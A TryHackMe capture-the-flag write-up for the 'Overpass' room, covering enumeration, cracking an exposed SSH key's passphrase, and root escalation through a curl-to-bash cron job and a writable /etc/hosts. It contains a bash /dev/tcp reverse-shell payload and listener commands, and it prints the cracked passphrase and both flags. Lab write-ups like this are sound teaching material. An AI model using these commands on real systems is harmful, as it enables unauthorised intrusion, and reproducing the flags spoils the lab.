# TryHackMe — Overpass

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Focus](https://img.shields.io/badge/Focus-Web%20Enumeration%20%7C%20SSH%20%7C%20Cron%20Abuse-blue)
![OS](https://img.shields.io/badge/Target-Linux-orange)

## Overview

This write-up documents the **Overpass** TryHackMe room.

The path shown in the screenshots is:

1.  Enumerate the target and find the website and SSH service.
2.  Discover the administrator page and inspect the login JavaScript.
3.  Find an encrypted SSH private key in the website content.
4.  Crack the key's passphrase and SSH in as `james`.
5.  Find a root-run cron job and a world-writable `/etc/hosts`.
6.  Redirect the cron job's domain to an attacker-controlled HTTP server and serve a reverse-shell script.
7.  Catch a root shell and read both flags.

## Attack chain

``` text
Nmap: SSH + HTTP
      |
      v
Gobuster discovers /admin
      |
      v
Inspect login JavaScript / website content
      |
      v
Obtain encrypted SSH private key for james
      |
      v
ssh2john + John -> passphrase `jamesi3`
      |
      v
SSH as james -> user flag
      |
      v
Find root cron job: curl overpass.thm/.../buildscript.sh | bash
      |
      v
Discover /etc/hosts is world-writable
      |
      v
Redirect overpass.thm to attacker IP
      |
      v
Serve modified buildscript.sh + catch reverse shell
      |
      v
Root shell -> root flag
```

## 1. Enumerate services

Run a service/version scan against the target:

``` bash
nmap -sV -sC <TARGET_IP>
```

The screenshot identifies:

        Port Service   Finding
  ---------- --------- ---------------------------------------------
    `22/tcp` SSH       OpenSSH 8.2p1 on Ubuntu
    `80/tcp` HTTP      Go-based HTTP server; site title `Overpass`

<img width="774" height="298" alt="1" src="https://github.com/user-attachments/assets/ac5729b7-ae71-467e-a171-1dc975f70490" />

## 2. Explore the website and enumerate directories

Browse to the target:

``` text
http://<TARGET_IP>/
```

The page advertises Overpass, a password manager.

<img width="1283" height="491" alt="2" src="https://github.com/user-attachments/assets/d7184e1f-6ecc-430c-894b-9fce532c43a9" />

Use Gobuster to discover web directories:

``` bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt
```

The screenshot shows directories including `/aboutus`, `/admin`, `/css`, `/downloads`, and `/img`.

<img width="900" height="385" alt="3" src="https://github.com/user-attachments/assets/59871c24-7b68-43ce-852b-6108f23f9298" />

Open the administrator page:

``` text
http://<TARGET_IP>/admin/
```

It presents a login form.

<img width="665" height="349" alt="4" src="https://github.com/user-attachments/assets/0011af3a-22d6-4bd1-a1df-0060304ee877" />

Inspect the login JavaScript source:

``` text
view-source:http://<TARGET_IP>/login.js
```

The source shows that the login handler sends credentials to `/api/login` and stores the returned value in a `SessionToken` cookie before redirecting to `/admin`. Review the client-side logic and site files for further clues.

<img width="860" height="727" alt="5" src="https://github.com/user-attachments/assets/59666726-e9d1-45cc-85e5-439098784164" />

## 3. Recover the SSH private key

The screenshots show an encrypted RSA private key exposed through the website. Save the key locally as `private` and restrict its permissions:

``` bash
chmod 600 private
```

<img width="1183" height="543" alt="6" src="https://github.com/user-attachments/assets/3190bcc5-6a0f-44aa-bcc6-49db4fc68e0a" />

Convert the private-key passphrase hash into a format John the Ripper can process:

``` bash
ssh2john private > private_rsa.txt
```

<img width="595" height="120" alt="7" src="https://github.com/user-attachments/assets/742175c7-13c5-44e7-9480-45953b156d07" />

Run John:

``` bash
john private_rsa.txt
```

The screenshot shows the recovered passphrase:

``` text
jamesi3
```

<img width="821" height="283" alt="8" src="https://github.com/user-attachments/assets/eb9b5cdc-0c9d-4026-b2b6-cccc2015c9ab" />

## 4. SSH as `james`

Use the private key and recovered passphrase to connect:

``` bash
ssh -i private james@<TARGET_IP>
```

Enter `jamesi3` when prompted for the key passphrase.

<img width="661" height="567" alt="9" src="https://github.com/user-attachments/assets/74a39a2b-9d66-4bfe-9039-1e35044ddb82" />

Read the user flag:

``` bash
cat user.txt
```

The screenshot shows the user flag:

``` text
thm{65c1aa4f009065b969822c6281eb6f7}
```

<img width="349" height="89" alt="10" src="https://github.com/user-attachments/assets/b11264a7-1392-48b7-8342-71d8baa87785" />

## 5. Inspect scheduled tasks

Review the system-wide cron configuration:

``` bash
cat /etc/crontab
```

The screenshot shows a root-owned job running every minute:

``` bash
curl overpass.thm/downloads/src/buildscript.sh | bash
```

This is a dangerous design: a script fetched over HTTP is piped directly into a root shell. If the hostname can be redirected to an attacker-controlled server, the downloaded script can be replaced.

<img width="846" height="280" alt="11" src="https://github.com/user-attachments/assets/485370e2-5ccc-4013-8ef9-e5bccd7a66f4" />

## 6. Check `/etc/hosts` permissions

Check the permissions on `/etc/hosts`:

``` bash
ls -la /etc/hosts
```

The screenshot shows the file is world-writable:

``` text
-rw-rw-rw-
```

<img width="448" height="37" alt="12" src="https://github.com/user-attachments/assets/af7b0faf-c1c3-4ca6-9dd7-4fbc9afc719f" />

Because `/etc/hosts` is writable, the hostname `overpass.thm` can be mapped to the attacker's VPN IP.

## 7. Prepare a replacement build script

On your attack machine, create a working directory that mirrors the URL path requested by the cron job:

``` bash
mkdir -p ~/overpass/downloads/src
cd ~/overpass/downloads/src
```

Create `buildscript.sh` with a reverse shell that connects back to your VPN IP and a listening port. The screenshot shows a Bash TCP reverse-shell payload targeting port `4444`:

``` bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4444 0>&1
```

Make it executable if desired:

``` bash
chmod +x buildscript.sh
```

<img width="431" height="52" alt="13-1" src="https://github.com/user-attachments/assets/628bb43b-289b-4b87-9218-765229ad6f8e" />
<img width="753" height="54" alt="13-2" src="https://github.com/user-attachments/assets/0797be80-fb77-423e-b49d-08f137d49948" />
<img width="441" height="47" alt="14-1" src="https://github.com/user-attachments/assets/604d37c0-6f68-4688-a1c6-4adc6651e015" />

## 8. Serve the replacement script

From the directory that contains the `downloads/` folder, start a simple HTTP server on port 80:

``` bash
cd ~/overpass
sudo python3 -m http.server 80
```

Ensure the file is reachable at:

``` text
http://<YOUR_TUN0_IP>/downloads/src/buildscript.sh
```

The screenshot shows the target requesting the script from the attack machine.

<img width="745" height="97" alt="14-2" src="https://github.com/user-attachments/assets/85aef909-6cdc-4f80-9ccf-0fb59aa52301" />

## 9. Catch the root shell

Start a listener on the callback port:

``` bash
nc -lvnp 4444
```

Once the scheduled root cron job resolves `overpass.thm` to your machine and fetches the replacement script, the listener receives a connection. The screenshot shows a shell prompt as `root`.

<img width="693" height="169" alt="14-3" src="https://github.com/user-attachments/assets/7f9a827b-064f-4871-a5ad-81885ad71f31" />

## 10. Retrieve the root flag

From the root shell, inspect the directory and read the flag:

``` bash
ls
cat /root/root.txt
```

The screenshot shows:

``` text
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

<img width="349" height="180" alt="15" src="https://github.com/user-attachments/assets/f107c570-c2fb-43f8-940e-3d8796818ac2" />

## Flags

  User   `thm{65c1aa4f009065b969822c6281eb6f7}`
  Root   `thm{7f336f8c359dbac18d54fdd64ea753bb}`
